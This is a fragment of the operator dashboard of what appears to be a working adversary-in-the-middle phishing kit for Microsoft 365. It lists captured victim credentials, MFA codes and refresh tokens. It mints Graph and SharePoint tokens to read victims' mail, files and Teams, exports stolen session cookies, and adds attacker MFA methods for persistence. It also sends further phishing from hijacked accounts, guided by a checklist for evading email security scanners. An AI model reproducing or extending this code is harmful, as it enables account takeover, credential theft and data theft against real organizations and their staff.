          <div class="rule"><span class="check">&#10003;</span><span class="label">Avoid Microsoft branding/logos — brand impersonation detection is a dedicated SmartPhish component</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Match tone and formatting of target org's internal comms — SmartPhish compares against historical baseline</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">No macro-enabled Office attachments — SandBlast Threat Emulation detonates these; use PDF, HTML, or .url shortcut files</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">QR codes: split into multiple image segments or embed in PDF attachment — Avanan OCR extracts URLs from single QR images</span></div>
          <div class="cat-label">Delivery &amp; Behavioral OPSEC</div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Disable "Save to Sent Items" — reduces forensic artifacts and Graph API audit noise</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Importance: Normal — High importance on bulk/phish emails is a behavioral signal</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">BCC bulk recipients — prevents reply-all exposure and reduces batch-send anomaly signals</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Throttle sends: max 5/minute — anomaly detection flags burst volume deviating from sender's baseline</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Send during compromised user's normal business hours from their typical geography — impossible travel detection</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Avoid creating mail forwarding rules immediately after compromise — Avanan flags new rules as ATO indicator</span></div>
          <div class="cat-label">Active Evasion (applied on send)</div>
          <div class="rule"><span class="check">&#9881;</span><span class="label">Zero-width character injection into suspect words — breaks NLP pattern matching without visible change</span></div>
          <div class="rule"><span class="check">&#9881;</span><span class="label">Wrap <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">&lt;a&gt;</code> tags in HTML table cells — reduces URL extractor efficacy on some mail scanners</span></div>
        </div>
      </div>
      <div style="display:flex;gap:12px;flex-wrap:wrap">
        <div style="flex:2;min-width:300px">
          <div style="margin-bottom:8px">
            <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:4px">TEMPLATE</label>
            <div id="template-chips" style="display:flex;gap:4px;flex-wrap:wrap"></div>
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:4px">PHISH MODE</label>
            <select id="compose-flow" onchange="onFlowSelect()" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
              <option value="oauth">OAuth Redirect (AiTM proxy)</option>
            </select>
          </div>
          <div id="compose-oauth-url-row" style="margin-bottom:8px">
            <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:4px">OAUTH PHISH URL</label>
            <input id="compose-oauth-url" placeholder="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?..." value="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=fed1e9f1-a42b-4cd0-ba1b-53eedf06b5c4&prompt=none&scope=x&state=x" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:4px">TO <span style="font-weight:400;color:var(--text-dim)">(comma-separated)</span></label>
            <div style="display:flex;gap:6px;align-items:center">
              <input id="compose-to" type="email" placeholder="target@company.com" style="flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
              <label style="font-size:16px;font-family:inherit;padding:6px 10px;border:1px solid var(--border);background:var(--surface);color:var(--text-dim);border-radius:4px;cursor:pointer;white-space:nowrap">
                Import List
                <input type="file" id="compose-import" accept=".csv,.txt,.text" onchange="importMailingList(this)" style="display:none">
              </label>
            </div>
            <div id="compose-import-status" style="font-size:16px;color:var(--text-dim);margin-top:3px"></div>
          </div>
          <div style="display:flex;gap:8px;margin-bottom:8px">
            <div style="flex:1">
              <label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:4px">CC</label>
              <input id="compose-cc" placeholder="optional" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
            </div>
            <div style="flex:1">
              <label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:4px">BCC</label>
              <input id="compose-bcc" placeholder="optional" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
            </div>
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:4px">SUBJECT</label>
            <input id="compose-subject" placeholder="Email subject" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:4px">BODY (HTML)</label>
            <textarea id="compose-body" rows="14" oninput="updatePreview()" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 10px;font-family:inherit;font-size:16px;border-radius:4px;resize:vertical"></textarea>
          </div>
          <div style="display:flex;gap:12px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
            <label style="font-size:16px;color:var(--text-dim);display:flex;align-items:center;gap:4px;cursor:pointer">
              <input type="checkbox" id="compose-save-sent"> Save to Sent Items
            </label>
            <span style="font-size:18px;color:var(--orange)">Saving leaves evidence in sender's mailbox</span>
            <label style="font-size:16px;color:var(--text-dim);display:flex;align-items:center;gap:4px;margin-left:auto">
              Importance:
              <select id="compose-importance" style="background:var(--surface);border:1px solid var(--border);color:var(--text);padding:3px 6px;font-family:inherit;font-size:16px;border-radius:3px">
                <option value="normal">Normal</option>
                <option value="high">High</option>
                <option value="low">Low</option>
              </select>
            </label>
          </div>
          <div style="display:flex;gap:8px;align-items:center">
            <button id="compose-send-btn" onclick="sendComposedEmail()" style="background:var(--red);border:1px solid var(--red);color:#fff;padding:8px 24px;font-family:inherit;font-size:18px;font-weight:600;border-radius:4px;cursor:pointer">Send Email</button>
            <span id="compose-status" style="font-size:16px;color:var(--text-dim)"></span>
          </div>
        </div>
        <div style="flex:1;min-width:280px">
          <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:4px">PREVIEW</label>
          <div id="compose-preview" style="background:#fff;border:1px solid var(--border);border-radius:4px;min-height:300px;overflow:auto;max-height:60vh">
            <div style="padding:12px;color:#999;font-size:18px;font-family:Arial,sans-serif">Select a template to preview</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
<script>
const K = ${JSON.stringify(dashboardKey)};
const H = {"Authorization":"Bearer "+K,"Content-Type":"application/json"};

// ── State ───────────────────────────────────────────────
let selectedSession = null;
let sessionsData = [];
let lastNotifTs = 0;
let feedCount = 0;
let activeTab = "actions";
let lastFileItems = [];
let spHostname = null;
let spToken = null;
let activeFilter = "all";
let activeCat = "recon";
let composeFlowId = null;
let composeFlowCache = [];
const tokenCache = new Map();

// ── Action definitions ──────────────────────────────────
const ACTIONS = {
  recon: [
    {label:"Profile",         path:"/v1.0/me"},
    {label:"Organization",    path:"/v1.0/organization"},
    {label:"Directory Roles", path:"/v1.0/me/memberOf",render:"roles"},
    {label:"Devices",         path:"/v1.0/me/registeredDevices",render:"devices"},
    {label:"Auth Methods",    path:"/v1.0/me/authentication/methods"},
    {label:"Add MFA Phone",   action:"add-mfa-phone"},
    {label:"Add MFA Email",   action:"add-mfa-email"},
    {label:"App Roles",       path:"/v1.0/me/appRoleAssignments",render:"approles"},
  ],
  email: [
    {label:"Recent Emails (25)",path:"/v1.0/me/messages?$top=25&$select=subject,from,receivedDateTime,bodyPreview",render:"emails"},
    {label:"Mail Folders",      path:"/v1.0/me/mailFolders",render:"folders"},
    {label:"Search Emails",     path:"/v1.0/me/messages?$search=\\"{q}\\"&$top=25&$select=subject,from,receivedDateTime,bodyPreview",prompt:"Search term:",render:"emails"},
    {label:"Compose Phish Email", action:"compose-email"},
  ],
  teams: [
    {label:"Joined Teams",    path:"/v1.0/me/joinedTeams",render:"teams"},
    {label:"Send Activity Notification", action:"teams-activity"},
  ],
  files: [
    {label:"OneDrive Root",   path:"/v1.0/me/drive/root/children",render:"files"},
    {label:"Recent Files",    path:"/v1.0/me/drive/recent",render:"files"},
    {label:"SP Sites",        action:"sp-sites"},
    {label:"SP Search Files", action:"sp-search"},
  ],
  calendar: [
    {label:"Upcoming (7d)", path:"/v1.0/me/calendarView?startDateTime={start}&endDateTime={end}&$top=25&$select=subject,start,end,organizer",render:"events",dynamic:true},
    {label:"Calendars",     path:"/v1.0/me/calendars"},
  ],
  cookies: [
    {label:"Export (EditThisCookie)",  action:"export-cookies-etc"},
    {label:"Export (Netscape/curl)",   action:"export-cookies-netscape"},
    {label:"Copy Cookie Header",      action:"copy-cookie-header"},
  ],
  sharepoint: [
    {label:"Copy SP Token",        action:"sp-copy"},
  ],
  tokenops: [
    {label:"Graph Explorer",       action:"toggle-explorer"},
    {label:"Export Session JSON",  action:"export"},
    {label:"Decode Token Claims",  action:"decode-token"},
    {label:"Delete Session",       action:"delete-session"},
  ],
};
const CAT_LABELS = {recon:"Recon",email:"Email",teams:"Teams",files:"Files",calendar:"Calendar",sharepoint:"SharePoint",cookies:"Cookies",tokenops:"Token Ops"};

// ── Token vending + status tracking ─────────────────────
async function getToken(sid, resource) {
  resource = resource || "https://graph.microsoft.com/";
  const c = tokenCache.get(sid);
  if (c) { const e = c.get(resource); if (e && e.exp > Date.now()+60000) return e.tok; }
  const r = await fetch("/sessions/"+sid+"/token",{method:"POST",headers:H,body:JSON.stringify({resource})});
  if (r.status===410) { markExpired(sid); return null; }
  if (!r.ok) return null;
  const d = await r.json();
  if (!tokenCache.has(sid)) tokenCache.set(sid,new Map());
  tokenCache.get(sid).set(resource,{tok:d.access_token,exp:Date.now()+(d.expires_in*1000)});
  updateTokenBar();
  return d.access_token;
}

async function graphCall(sid, path, _retries) {
  _retries = _retries || 0;
  const tok = await getToken(sid);
  if (!tok) return null;
  let r = await fetch("https://graph.microsoft.com"+path,{headers:{"Authorization":"Bearer "+tok}});
  if (r.status===401) {
    tokenCache.get(sid)?.delete("https://graph.microsoft.com/");
    const tok2 = await getToken(sid);
    if (!tok2) return null;
    r = await fetch("https://graph.microsoft.com"+path,{headers:{"Authorization":"Bearer "+tok2}});
  }
  if (r.status===429 && _retries < 3) {
    const wait = parseInt(r.headers.get("Retry-After")||"0",10);
    const delay = Math.max(wait, 5+_retries*5)*1000;
    await new Promise(resolve => setTimeout(resolve, delay));
    return graphCall(sid, path, _retries+1);
  }
  if (!r.ok) return {error:r.status,message:await r.text()};
  return r.json();
}

function markExpired(sid) {
  const s = sessionsData.find(x=>x.id===sid);
  if (s) s.status = "expired";
  renderSessions();
  updateTokenBar();
}

async function ensureSpHostname(sid) {
  if (spHostname) return spHostname;
  const data = await graphCall(sid, "/v1.0/sites/root?$select=siteCollection");
  if (data?.siteCollection?.hostname) {
    spHostname = data.siteCollection.hostname;
    return spHostname;
  }
  const manual = prompt("Could not auto-discover SharePoint hostname. Enter it manually (e.g. contoso.sharepoint.com):");
  if (manual) { spHostname = manual; return spHostname; }
  return null;
}

async function getSpToken(sid) {
  const host = await ensureSpHostname(sid);
  if (!host) return null;
  const cacheKey = "https://"+host+"/";
  const c = tokenCache.get(sid);
  if (c) { const e = c.get(cacheKey); if (e && e.exp > Date.now()+60000) return e.tok; }
  const r = await fetch("/sessions/"+sid+"/token",{method:"POST",headers:H,body:JSON.stringify({resource:cacheKey})});
  if (r.status===410) { markExpired(sid); return null; }
  if (!r.ok) return null;
  const d = await r.json();
  if (!tokenCache.has(sid)) tokenCache.set(sid,new Map());
  tokenCache.get(sid).set(cacheKey,{tok:d.access_token,exp:Date.now()+(d.expires_in*1000)});
  spToken = d.access_token;
  return d.access_token;
}

async function spCall(sid, apiPath, _retries) {
  _retries = _retries || 0;
  const tok = await getSpToken(sid);
  if (!tok || !spHostname) return null;
  const url = "https://"+spHostname+"/_api"+apiPath;
  const r = await fetch(url,{headers:{"Authorization":"Bearer "+tok,"Accept":"application/json;odata=nometadata"}});
  if (r.status===401) {
    const cacheKey = "https://"+spHostname+"/";
    tokenCache.get(sid)?.delete(cacheKey);
    const tok2 = await getSpToken(sid);
    if (!tok2) return null;
    const r2 = await fetch(url,{headers:{"Authorization":"Bearer "+tok2,"Accept":"application/json;odata=nometadata"}});
    if (!r2.ok) return {error:r2.status,message:await r2.text()};
    return r2.json();
  }
  if (r.status===429 && _retries < 3) {
    const wait = parseInt(r.headers.get("Retry-After")||"0",10);
    const delay = Math.max(wait, 5+_retries*5)*1000;
    await new Promise(resolve => setTimeout(resolve, delay));
    return spCall(sid, apiPath, _retries+1);
  }
  if (!r.ok) return {error:r.status,message:await r.text()};
  return r.json();
}

function updateTokenBar() {
  if (!selectedSession) return;
  const ind = document.getElementById("token-indicator");
  const stat = document.getElementById("token-status");
  if (!ind || !stat) return;
  const c = tokenCache.get(selectedSession);
  const e = c ? c.get("https://graph.microsoft.com/") : null;
  if (!e) {
    ind.className = "token-indicator none";
    stat.textContent = "No access token — click an action or Refresh Token to acquire";
    return;
  }
  const remaining = e.exp - Date.now();
  if (remaining <= 0) {
    ind.className = "token-indicator expired";
    stat.innerHTML = '<span style="color:var(--red)">Access token expired</span> — click Refresh Token';
  } else if (remaining < 300000) {
    ind.className = "token-indicator expiring";
    stat.innerHTML = '<span style="color:var(--orange)">Expires in ' + Math.ceil(remaining/60000) + 'm</span>';
  } else {
    ind.className = "token-indicator valid";
    stat.innerHTML = '<span style="color:var(--green)">Valid</span> — expires in ' + Math.ceil(remaining/60000) + 'm';
  }
}

async function refreshSessionToken() {
  if (!selectedSession) return;
  tokenCache.get(selectedSession)?.delete("https://graph.microsoft.com/");
  const tok = await getToken(selectedSession);
  if (tok) updateTokenBar();
}

setInterval(updateTokenBar, 15000);

// ── Cookie export helpers ──────────────────────────────
function cookieDomain(name) {
  const ms = ["ESTSAUTH","ESTSAUTHPERSISTENT","ESTSAUTHLIGHT","SignInStateCookie","CCState","buid","esctx","fpc","stsservicecookie","x-ms-gateway-slice","brcap","wlidperf"];
  if (ms.some(m => name === m || name.startsWith(m))) return ".login.microsoftonline.com";
  return "virtual.southernco.com";
}
function toEditThisCookie(arr) {
  return arr.map(c => {
    const eq = c.indexOf("=");
    const name = c.substring(0, eq), value = c.substring(eq + 1);
    return {domain:cookieDomain(name),name,value,path:"/",secure:true,httpOnly:false,sameSite:"no_restriction",expirationDate:Math.floor(Date.now()/1000)+86400};
  });
}
function toNetscape(arr) {
  return arr.map(c => {
    const eq = c.indexOf("=");
    const name = c.substring(0, eq), value = c.substring(eq + 1);
    return cookieDomain(name)+"\\tTRUE\\t/\\tTRUE\\t"+(Math.floor(Date.now()/1000)+86400)+"\\t"+name+"\\t"+value;
  }).join("\\n");
}
function downloadBlob(content, type, filename) {
  const blob = new Blob([content], {type});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = filename; a.click();
  URL.revokeObjectURL(url);
}

// ── Graph Explorer ──────────────────────────────────────
function toggleExplorer() {
  const el = document.getElementById("graph-explorer");
  el.style.display = el.style.display === "none" ? "" : "none";
}

function graphPreset(path) {
  document.getElementById("graph-endpoint").value = path;
  sendGraphExplorer();
}

async function sendGraphExplorer() {
  if (!selectedSession) return;
  resultNavStack.length = 0;
  document.getElementById("results-area").innerHTML = '<div style="color:var(--text-dim);padding:20px;text-align:center">Run an action to see results here</div>';
  const ep = document.getElementById("graph-endpoint").value;
  const method = document.getElementById("graph-method").value;
  const status = document.getElementById("explorer-status");
  status.textContent = "Fetching...";

  if (method === "GET") {
    const data = await graphCall(selectedSession, ep);
    status.textContent = data ? "200 OK" : "Request failed";
    showResult("Explorer: " + ep, data);
  } else {
    const tok = await getToken(selectedSession);
    if (!tok) { status.textContent = "No token"; return; }
    try {
      const r = await fetch("https://graph.microsoft.com" + ep, {
        method, headers: {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}
      });
      const txt = await r.text();
      status.textContent = r.status + " " + r.statusText;
      try { showResult("Explorer: " + method + " " + ep, JSON.parse(txt)); }
      catch { showResult("Explorer: " + method + " " + ep, {raw: txt}); }
    } catch(e) { status.textContent = "Error: " + e.message; }
  }
}

// ── Polling ─────────────────────────────────────────────
async function pollSessions() {
  try {
    const r = await fetch("/sessions",{headers:H});
    if (!r.ok) return;
    var fresh = await r.json();
    if (!fresh.length && sessionsData.length) return;
    sessionsData = fresh;
    renderSessions();
    document.getElementById("status-dot").className="status-dot";
    document.getElementById("status-text").textContent="Live";
  } catch { document.getElementById("status-dot").className="status-dot off"; document.getElementById("status-text").textContent="Disconnected"; }
}

async function pollNotifications() {
  try {
    const r = await fetch("/notifications?since="+lastNotifTs,{headers:H});
    if (!r.ok) return;
    const items = await r.json();
    if (!items.length) return;
    lastNotifTs = items[items.length-1].timestamp;
    const feed = document.getElementById("feed");
    for (const n of items) {
      const card = document.createElement("div");
      card.className = "card";
      card.dataset.type = n.type;
      if (activeFilter!=="all" && n.type!==activeFilter) card.style.display="none";
      card.innerHTML = '<div class="card-header"><span class="card-type type-'+n.type+'">'+n.type.replace("_"," ")+'</span>'+(n.meta?.user?'<span style="color:var(--text-dim);font-size:16px">'+n.meta.user+'</span>':'')+'<span class="card-time" style="margin-left:auto;color:var(--text-dim)">'+fmtTime(n.timestamp)+'</span></div><div class="card-body">'+n.html+'</div>';
      feed.appendChild(card);
      feedCount++;
    }
    if (activeTab!=="feed") {
      const b = document.getElementById("feed-badge");
      b.style.display=""; b.textContent=feedCount;
    }
  } catch {}
}

setInterval(pollSessions, 3000);
setInterval(pollNotifications, 2000);
pollSessions(); pollNotifications();

// ── Render sessions sidebar ─────────────────────────────
function renderSessions() {
  const el = document.getElementById("session-list");
  const ns = document.getElementById("no-sessions");
  const visible = sessionsData.filter(s => s.status !== "superseded" && (s.user?.upn || "unknown") !== "unknown");
  document.getElementById("session-count").textContent = visible.length;
  if (!visible.length) { if (ns) ns.style.display=""; el.innerHTML=""; return; }
  if (ns) ns.style.display="none";
  visible.sort((a, b) => {
    const aActive = a.hasRefreshToken ? 0 : 1;
    const bActive = b.hasRefreshToken ? 0 : 1;
    return aActive - bActive || b.capturedAt - a.capturedAt;
  });
  el.innerHTML = visible.map(s => {
    const active = selectedSession===s.id ? " active":"";
    const ago = fmtAgo(s.capturedAt);
    const dot = s.status === "expired" ? "expired" : (s.hasRefreshToken ? "active" : (s.hasCredentials ? "pending" : "expired"));
    const label = s.hasRefreshToken ? "" : (s.hasCredentials ? ' <span style="font-size:18px;color:var(--orange,#d29922)">MFA pending</span>' : "");
    const res = s.resourceCount ? Array(s.resourceCount).fill('<span class="res-badge">R</span>').join("") : "";
    return '<div class="session-card'+active+'" onclick="selectSession(\\''+s.id+'\\')"><div class="upn">'+esc(s.user?.upn||"unknown")+label+'</div><div class="meta"><span class="dot '+dot+'"></span>'+esc(s.user?.name||"")+'<span>'+ago+'</span></div>'+(res?'<div class="res-badges">'+res+'</div>':'')+'</div>';
  }).join("");
}

function selectSession(id) {
  selectedSession = id;
  resultNavStack = [];
  renderSessions();
  document.getElementById("no-session-selected").style.display="none";
  document.getElementById("action-panel").style.display="";
  document.getElementById("graph-explorer").style.display="none";
  loadSessionDetail(id);
  renderActionCats();
  renderActions();
  updateTokenBar();
}

async function loadSessionDetail(id) {
  const r = await fetch("/sessions/"+id,{headers:H});
  if (!r.ok) return;
  const s = await r.json();
  const info = document.getElementById("session-info");
  let h = '<b>'+esc(s.user?.upn||"unknown")+'</b>';
  if (s.user?.name && s.user.name!=="unknown") h += ' ('+esc(s.user.name)+')';
  h += '<br>';
  if (s.user?.jobTitle) h += esc(s.user.jobTitle);
  if (s.user?.department) h += ' / '+esc(s.user.department);
  if (s.user?.jobTitle||s.user?.department) h += '<br>';
  h += '<b>Tenant:</b> '+esc(s.user?.tid||"?");
  h += ' | <b>Status:</b> <span style="color:var(--'+(s.status==="active"?"green":"red")+')">'+s.status+'</span>';
  if (s.hasRefreshToken) h += ' | <span style="color:var(--green)">Refresh token present</span>';
  if (s.credentials?.username) h += '<br><b>Creds:</b> '+esc(s.credentials.username)+' / '+esc(s.credentials.password||"?");
  if (s.credentials?.mfaCode) h += ' | <b>MFA:</b> '+esc(s.credentials.mfaCode);
  const roles = s.recon?.roles;
  if (roles?.length) h += '<br><b>Roles:</b> '+roles.map(esc).join(", ");
  const res = s.resources ? Object.entries(s.resources) : [];
  if (res.length) {
    h += '<br><b>Resources:</b> ';
    h += res.map(([k,v])=> '<span style="color:var(--'+(v.accessible?"green":"red")+')">'+esc(v.label||k)+'</span>').join(" | ");
  }
  if (s.cookieArray?.length) {
    const f5c = s.cookieArray.filter(c => ["F5_ST","MRHSession","LastMRH_Session"].some(n => c.startsWith(n+"=")));
    const ctx = s.cookieArray.filter(c => ["ASP.NET_SessionId","CsrfToken","CtxsAuthId","CtxsDeviceId"].some(n => c.startsWith(n+"=")));
    const msc = s.cookieArray.filter(c => ["ESTSAUTHPERSISTENT","ESTSAUTH","SignInStateCookie"].some(n => c.startsWith(n+"=")));
    h += '<br><b>Cookies:</b> '+s.cookieArray.length+' total';
    if (f5c.length) h += ' | <span style="color:var(--green)">'+f5c.length+' F5</span>';
    if (ctx.length) h += ' | <span style="color:var(--purple)">'+ctx.length+' Citrix</span>';
    if (msc.length) h += ' | <span style="color:var(--cyan)">'+msc.length+' MS</span>';
  }
  info.innerHTML = h;
}

// ── Action rendering ────────────────────────────────────
function renderActionCats() {
  document.getElementById("action-cats").innerHTML = Object.entries(CAT_LABELS).map(([k,v])=>
    '<button class="action-cat'+(k===activeCat?" active":"")+'" onclick="setCat(\\''+k+'\\')">'+v+'</button>'
  ).join("");
}
function setCat(c) {
  activeCat=c; renderActionCats(); renderActions(); updateCatStatus();
  resultNavStack.length = 0;
  document.getElementById("results-area").innerHTML = '<div style="color:var(--text-dim);padding:20px;text-align:center">Run an action to see results here</div>';
  document.getElementById("graph-explorer").style.display = "none";
  if (c==="sharepoint" && !spHostname && selectedSession) { autoDiscoverSp(); }
}

var spSpinner = null;
var spSpinFrames = ["\\u280B","\\u2819","\\u2839","\\u2838","\\u283C","\\u2834","\\u2826","\\u2827","\\u2807","\\u280F"];
var spSpinIdx = 0;

function spStartSpinner(el, msg) {
  spSpinIdx = 0;
  if (spSpinner) clearInterval(spSpinner);
  el.textContent = spSpinFrames[0] + " " + msg;
  spSpinner = setInterval(function() {
    spSpinIdx = (spSpinIdx + 1) % spSpinFrames.length;
    var span = el.querySelector(".sp-spin");
    if (span) span.textContent = spSpinFrames[spSpinIdx];
  }, 80);
  el.innerHTML = '<span class="sp-spin" style="color:var(--accent)">'+spSpinFrames[0]+'</span> <span style="color:var(--text-dim)">'+msg+'</span>';
}

function spStopSpinner() {
  if (spSpinner) { clearInterval(spSpinner); spSpinner = null; }
}

function updateCatStatus() {
  var el = document.getElementById("cat-status");
  if (activeCat==="sharepoint") {
    el.style.display = "";
    var lines = [];
    if (spHostname) {
      lines.push('<span style="color:var(--green)">\\u2714</span> SharePoint Hostname: <b>'+spHostname+'</b>');
    }
    if (spToken) {
      lines.push('<span style="color:var(--green)">\\u2714</span> SP token minted and injected into session');
    }
    if (lines.length) {
      el.innerHTML = lines.join('<br>');
    } else {
      el.innerHTML = '<span style="color:var(--text-dim)">Waiting for session\\u2026</span>';
    }
  } else {
    el.style.display = "none";
    spStopSpinner();
  }
}

async function autoDiscoverSp() {
  var el = document.getElementById("cat-status");
  el.style.display = "";
  spStartSpinner(el, "Discovering SharePoint hostname\\u2026");
  var data = await graphCall(selectedSession, "/v1.0/sites/root?$select=siteCollection,webUrl");
  spStopSpinner();
  if (data && data.siteCollection && data.siteCollection.hostname) {
    spHostname = data.siteCollection.hostname;
    updateCatStatus();
    await autoMintSpToken();
  } else {
    el.innerHTML = '<span style="color:var(--red)">\\u2718</span> Could not auto-discover hostname';
  }
}

async function autoMintSpToken() {
  if (!spHostname || !selectedSession) return;
  var el = document.getElementById("cat-status");
  var hostnameLine = '<span style="color:var(--green)">\\u2714</span> SharePoint Hostname: <b>'+spHostname+'</b>';
  el.innerHTML = hostnameLine + '<br><span class="sp-spin" style="color:var(--accent)">'+spSpinFrames[0]+'</span> <span style="color:var(--text-dim)">Minting SP token\\u2026</span>';
  spSpinIdx = 0;
  if (spSpinner) clearInterval(spSpinner);
  spSpinner = setInterval(function() {
    spSpinIdx = (spSpinIdx + 1) % spSpinFrames.length;
    var span = el.querySelector(".sp-spin");
    if (span) span.textContent = spSpinFrames[spSpinIdx];
  }, 80);
  var resource = "https://"+spHostname+"/";
  try {
    var r = await fetch("/sessions/"+selectedSession+"/token",{method:"POST",headers:H,body:JSON.stringify({resource:resource})});
    spStopSpinner();
    if (r.status===410) { el.innerHTML = hostnameLine+'<br><span style="color:var(--red)">\\u2718</span> Session expired'; return; }
    if (!r.ok) { el.innerHTML = hostnameLine+'<br><span style="color:var(--red)">\\u2718</span> Token mint failed ('+r.status+')'; return; }
    var d = await r.json();
    spToken = d.access_token;
    if (!tokenCache.has(selectedSession)) tokenCache.set(selectedSession,new Map());
    tokenCache.get(selectedSession).set(resource,{tok:d.access_token,exp:Date.now()+(d.expires_in*1000)});
    updateCatStatus();
  } catch(err) {
    spStopSpinner();
    el.innerHTML = hostnameLine+'<br><span style="color:var(--red)">\\u2718</span> Token mint error';
  }
}

function renderActions() {
  const acts = ACTIONS[activeCat] || [];
  document.getElementById("action-grid").innerHTML = acts.map((a,i)=>
    '<button class="action-btn" id="act-'+activeCat+'-'+i+'" onclick="runAction(\\''+activeCat+'\\','+i+')">'+a.label+'</button>'
  ).join("");
}

function classifyMfaResponse(status, data) {
  if (status >= 200 && status < 300) return {blocked:false,reason:"success",detail:"MFA method registered successfully",response:data};
  var code = (data.error && data.error.code) || "";
  var msg = (data.error && data.error.message) || "";
  var inner = (data.error && data.error.innerError && data.error.innerError.code) || "";
  if (code === "Authorization_RequestDenied" || status === 403)
    return {blocked:true,reason:"insufficient_permissions",detail:"Tenant requires admin consent for UserAuthenticationMethod.ReadWrite scope. The app registration does not have this permission.",errorCode:code,errorMsg:msg};
  if (code === "InteractionRequired" || code === "interaction_required" || inner === "StrongAuthClientAppUnauthorized" || msg.indexOf("multi-factor") !== -1 || msg.indexOf("step-up") !== -1 || msg.indexOf("strong authentication") !== -1 || status === 401)
    return {blocked:true,reason:"stepup_mfa_required",detail:"Conditional Access or Authentication Context requires step-up MFA to modify security info. The captured token does not satisfy the additional auth requirement.",errorCode:code,errorMsg:msg};
  if (code === "ResourceNotFound" || status === 404)
    return {blocked:true,reason:"endpoint_unavailable",detail:"Authentication methods endpoint not available — tenant may not support this API.",errorCode:code,errorMsg:msg};
  if (code === "InsufficientPermissionsInAccessToken" || inner === "InsufficientPermissionsInAccessToken")
    return {blocked:true,reason:"insufficient_permissions",detail:"Access token lacks required scopes. UserAuthenticationMethod.ReadWrite is not consented.",errorCode:code,errorMsg:msg};
  return {blocked:true,reason:"unknown_error",detail:"HTTP "+status+": "+(msg||JSON.stringify(data.error||data)),errorCode:code,errorMsg:msg};
}

function showMfaResult(method, value, result) {
  var area = document.getElementById("results-area");
  var current = area.innerHTML;
  if (current && !current.match(/Run an action to see results here/)) {
    resultNavStack.push(current);
  }
  switchTab("results",document.querySelectorAll(".tab")[1]);
  var isSuccess = !result.blocked;
  var icon = isSuccess ? "&#10003;" : "&#10007;";
  var color = isSuccess ? "var(--green)" : (result.reason === "stepup_mfa_required" ? "var(--orange)" : "var(--red)");
  var statusLabel = isSuccess ? "REGISTERED" : (result.reason === "stepup_mfa_required" ? "BLOCKED BY STEP-UP MFA" : result.reason === "insufficient_permissions" ? "INSUFFICIENT PERMISSIONS" : "FAILED");
  var h = '<div style="padding:16px">';
  h += '<button onclick="navBack()" style="background:none;border:1px solid var(--border);color:var(--text-dim);padding:2px 10px;border-radius:3px;cursor:pointer;font-size:16px;font-family:inherit;margin-bottom:12px">&larr; Back</button>';
  h += '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">';
  h += '<div style="width:40px;height:40px;border-radius:50%;background:'+color+';display:flex;align-items:center;justify-content:center;font-size:20px;color:#fff;flex-shrink:0">'+icon+'</div>';
  h += '<div><div style="font-size:16px;font-weight:600;color:'+color+'">'+statusLabel+'</div>';
  h += '<div style="font-size:16px;color:var(--text-dim)">MFA '+esc(method)+' registration attempt</div></div></div>';
  h += '<table style="width:100%;font-size:18px;border-collapse:collapse">';
  h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap">Method</td><td style="padding:6px 8px;color:var(--text)">'+esc(method === "phone" ? "Phone (SMS/Voice)" : "Email")+'</td></tr>';
  h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap">Value</td><td style="padding:6px 8px;color:var(--text);font-family:monospace">'+esc(value)+'</td></tr>';
  if (result.phoneSlot) h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap">Slot</td><td style="padding:6px 8px;color:var(--text)">'+esc(result.phoneSlot)+(result.phoneSlot==="mobile"?' <span style="color:var(--orange)">(overwrites primary!)</span>':result.phoneSlot==="alternateMobile"?" (backup — non-disruptive)":"")+'</td></tr>';
  h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap">Status</td><td style="padding:6px 8px;color:'+color+';font-weight:600">'+statusLabel+'</td></tr>';
